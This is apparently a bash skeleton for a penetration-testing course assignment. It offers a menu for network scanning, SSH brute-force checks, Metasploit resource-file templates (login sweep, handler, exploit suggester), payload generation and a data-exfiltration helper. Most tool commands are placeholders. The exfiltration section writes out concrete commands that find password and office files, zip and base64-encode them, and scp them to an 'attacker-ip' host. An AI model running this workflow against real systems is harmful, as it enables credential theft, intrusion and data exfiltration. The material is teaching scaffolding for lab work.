#!/usr/bin/env bash

# =========================================================
# Project Breach Point - Automation Skeleton
# =========================================================
# This script is a framework for your assignment.
# Fill in the tool-specific commands yourself for your lab.
# =========================================================

########################
# 0. Helper functions  #
########################

banner() {
    echo "========================================================="
    echo "[*] $1"
    echo "========================================================="
}

pause() {
    read -rp "Press Enter to continue..."
}

log_msg() {
    # Simple log to a file and screen
    local msg="$1"
    echo "$(date '+%F %T') : $msg" | tee -a "$SESSION_LOG"
}

############################
# 1. Get user input        #
############################

banner "Stage 1 - Getting User Input"

read -rp "Enter target network (e.g. 192.168.1.0/24): " TARGET_NET

read -rp "Enter name for output directory: " OUTDIR
mkdir -p "$OUTDIR"

# Create a timestamped run folder inside OUTDIR
RUN_ID="$(date '+run_%Y%m%d_%H%M%S')"
RUN_DIR="$OUTDIR/$RUN_ID"
mkdir -p "$RUN_DIR"/{scans,credentials,metasploit,payloads,logs}
SESSION_LOG="$RUN_DIR/logs/session.log"

log_msg "New session started. Target: $TARGET_NET, Output dir: $RUN_DIR"

# Basic or Full
while true; do
    read -rp "Choose scan type [basic/full]: " SCAN_TYPE
    SCAN_TYPE="$(echo "$SCAN_TYPE" | tr '[:upper:]' '[:lower:]')"
    if [[ "$SCAN_TYPE" == "basic" || "$SCAN_TYPE" == "full" ]]; then
        break
    else
        echo "Please enter 'basic' or 'full'."
    fi
done

log_msg "Scan type chosen: $SCAN_TYPE"


##################################
# 2. Recon / Nmap style scans    #
##################################

run_scans() {
    banner "Stage 2 - Network Scanning"
    log_msg "Starting network scans for $TARGET_NET"

    # --- Example placeholders: you insert actual commands ---
    # TCP scan example (replace with your desired options)
    # nmap <your_tcp_options> "$TARGET_NET" -oN "$RUN_DIR/scans/tcp_scan.txt"

    # UDP scan example
    # nmap <your_udp_options> "$TARGET_NET" -oN "$RUN_DIR/scans/udp_scan.txt"

    # Service/version detection, etc.

    if [[ "$SCAN_TYPE" == "full" ]]; then
        banner "Stage 2b - Full Scan: NSE + Vulnerability Check"
        log_msg "Running additional full-scope scans (NSE, vuln checks)"

        # Add your NSE / vulnerability scan commands here
        # nmap <nse_and_vuln_options> "$TARGET_NET" -oN "$RUN_DIR/scans/full_nse_scan.txt"

        # You can later parse these results and feed into searchsploit manually
        # or via an additional helper function.
    fi

    log_msg "Network scanning completed."
}


##########################################
# 3. Weak Credential Checks (Skeleton)   #
##########################################

weak_credentials() {
    banner "Stage 3 - Weak Credential Checks"
    log_msg "Starting weak credential checks"

    # Ask for password list
    read -rp "Use built-in password list? [Y/n]: " USE_BUILTIN
    USE_BUILTIN="${USE_BUILTIN:-Y}"

    if [[ "$USE_BUILTIN" =~ ^[Yy]$ ]]; then
        PASSLIST="./wordlists/password.lst"
    else
        read -rp "Enter path to your password list: " PASSLIST
    fi

    # Example: ask for username(s)
    read -rp "Enter username to test (or file with usernames): " USER_INPUT

    # For each service (SSH, RDP, FTP, SMB), you can:
    # - Ask for port/host
    # - Run your chosen tool (e.g. hydra) with appropriate options
    # - Save output under $RUN_DIR/credentials/

    # Placeholder structure:
    echo "[*] (Placeholder) Run SSH weak-password check here" \
        | tee -a "$RUN_DIR/credentials/ssh_credentials.txt"

    echo "[*] (Placeholder) Run RDP/FTP/SMB weak-password checks here" \
        | tee -a "$RUN_DIR/credentials/other_credentials.txt"

    log_msg "Weak credential checks completed (placeholders run)."
}


###############################################
# 4. Metasploit .rc File Generation (Skeleton)#
###############################################

generate_msf_rc() {
    banner "Stage 4 - Metasploit Resource File"
    log_msg "Generating Metasploit .rc file(s)"

    echo "Choose .rc type:"
    echo " 1) SSH login exploit/sweep"
    echo " 2) Create handler"
    echo " 3) Run suggester"
    read -rp "Enter choice [1-3]: " RC_CHOICE

    RC_FILE="$RUN_DIR/metasploit/session.rc"

    case "$RC_CHOICE" in
        1)
            # Build a resource file template for SSH login/bruteforce module
            cat > "$RC_FILE" <<'EOF'
# Example Metasploit SSH login RC template
# You must edit values (RHOSTS, USERNAME, PASS_FILE, etc.) before use.
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <TARGETS_HERE>
set USERNAME <USERNAME_HERE>
set PASS_FILE <PASSWORD_LIST_PATH>
set THREADS 4
run
EOF
            ;;
        2)
            cat > "$RC_FILE" <<'EOF'
# Example Metasploit handler RC template
use exploit/multi/handler
set PAYLOAD <PAYLOAD_TYPE>
set LHOST <LHOST_IP>
set LPORT <LPORT_NUM>
exploit -j
EOF
            ;;
        3)
            cat > "$RC_FILE" <<'EOF'
# Example Metasploit suggester RC template
use post/multi/recon/local_exploit_suggester
set SESSION <SESSION_ID>
run
EOF
            ;;
        *)
            echo "Invalid choice."
            return
            ;;
    esac

    log_msg "Generated Metasploit RC file at $RC_FILE"

    read -rp "Run msfconsole with this RC file now? [y/N]: " RUN_MSF
    if [[ "$RUN_MSF" =~ ^[Yy]$ ]]; then
        log_msg "User chose to run msfconsole with RC file."
        # Uncomment and adjust when ready for your lab
        # msfconsole -r "$RC_FILE"
    else
        echo "Skipping automatic msfconsole run."
    fi
}


###################################
# 5. Payload Generation Skeleton  #
###################################

generate_payload() {
    banner "Stage 5 - Payload Generation"
    log_msg "Starting payload generation"

    read -rp "Enter directory to store payload (default: $RUN_DIR/payloads): " PAYLOAD_DIR
    PAYLOAD_DIR="${PAYLOAD_DIR:-$RUN_DIR/payloads}"
    mkdir -p "$PAYLOAD_DIR"

    read -rp "Enter payload base name (no extension): " PAYLOAD_NAME
    read -rp "Enter LHOST: " LHOST
    read -rp "Enter LPORT: " LPORT
    read -rp "Enter output format (e.g. exe, elf): " FORMAT

    OUTFILE="$PAYLOAD_DIR/${PAYLOAD_NAME}.${FORMAT}"

    # Placeholder: you will add msfvenom or other payload generation command here.
    echo "[*] (Placeholder) Generate payload with your chosen tool and options." \
        | tee -a "$SESSION_LOG"
    echo "[*] Intended output file: $OUTFILE" | tee -a "$SESSION_LOG"

    log_msg "Payload generation placeholder finished."
}


#########################################
# 6. Data Exfiltration Helper Commands  #
#########################################

data_exfil_helper() {
    banner "Stage 6 - Data Exfiltration Helper"
    log_msg "Preparing data exfiltration helper commands"

    read -rp "Target OS [linux/windows]: " OS
    OS="$(echo "$OS" | tr '[:upper:]' '[:lower:]')"

    EXFIL_FILE="$RUN_DIR/logs/data_exfil_commands.txt"
    : > "$EXFIL_FILE"

    if [[ "$OS" == "linux" ]]; then
        cat >> "$EXFIL_FILE" <<'EOF'
# Linux - find interesting files
find / -type f \( -iname '*password*' -o -iname '*.docx' -o -iname '*.xlsx' \) 2>/dev/null

# Compress to zip
zip -r /tmp/exfil.zip <FILES_OR_DIRS_HERE>

# Base64 encode
base64 /tmp/exfil.zip > /tmp/exfil.zip.b64

# Copy to attacker machine (scp)
scp /tmp/exfil.zip.b64 user@attacker-ip:/path/
EOF
    elif [[ "$OS" == "windows" ]]; then
        cat >> "$EXFIL_FILE" <<'EOF'
REM Windows - find interesting files
dir C:\ /s /b *password* *.docx *.xlsx

REM Compress using built-in tools or 3rd party (fill in accordingly)
REM Example with PowerShell Compress-Archive:
REM   Compress-Archive -Path <files> -DestinationPath C:\exfil.zip

REM Encode to base64 using certutil
REM   certutil -encode C:\exfil.zip C:\exfil.zip.b64

REM Use your chosen method to transfer (e.g. scp, WinSCP, etc.)
EOF
    else
        echo "Unknown OS type. No commands generated."
        return
    fi

    log_msg "Data exfiltration helper commands written to $EXFIL_FILE"
    echo "Commands saved to: $EXFIL_FILE"
}


############################
# 7. Menu / main workflow  #
############################

show_menu() {
    while true; do
        echo
        echo "================= Main Menu ================="
        echo "1) Run network scans"
        echo "2) Weak credential checks"
        echo "3) Generate Metasploit .rc file"
        echo "4) Generate payload"
        echo "5) Data exfiltration helpers"
        echo "6) Search within results"
        echo "0) Exit"
        echo "============================================="
        read -rp "Enter choice: " CHOICE

        case "$CHOICE" in
            1) run_scans ;;
            2) weak_credentials ;;
            3) generate_msf_rc ;;
            4) generate_payload ;;
            5) data_exfil_helper ;;
            6) search_results ;;
            0) break ;;
            *) echo "Invalid choice." ;;
        esac
    done
}

search_results() {
    banner "Stage 7 - Search Inside Results"
    read -rp "Enter search term: " TERM
    log_msg "User searching results for term: $TERM"

    # Simple recursive grep under RUN_DIR
    grep -Rni --color=always "$TERM" "$RUN_DIR" || echo "No matches found."
}


############
#  Main    #
############

show_menu

banner "Session Summary"
log_msg "Session ended for $TARGET_NET"
echo "All outputs in: $RUN_DIR"
